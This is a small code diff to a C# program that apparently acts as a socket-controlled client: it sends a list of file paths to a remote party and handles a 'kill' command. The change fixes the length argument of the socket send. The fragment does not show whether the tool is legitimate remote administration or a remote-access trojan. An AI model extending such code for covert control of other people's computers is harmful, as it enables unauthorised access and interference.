@@ -65,7 +65,7 @@ public class Program
                 {
                     apps += file.FullName + ",";
                 }
-                ClientSocket.Send(System.Text.Encoding.ASCII.GetBytes(apps), 0, System.Text.Encoding.ASCII.GetBytes(list).Length, SocketFlags.None);
+                ClientSocket.Send(System.Text.Encoding.ASCII.GetBytes(apps), 0, System.Text.Encoding.ASCII.GetBytes(apps).Length, SocketFlags.None);
                 Console.WriteLine("sent processes");
             }
             else if (data[0].ToLower().Equals("kill"))
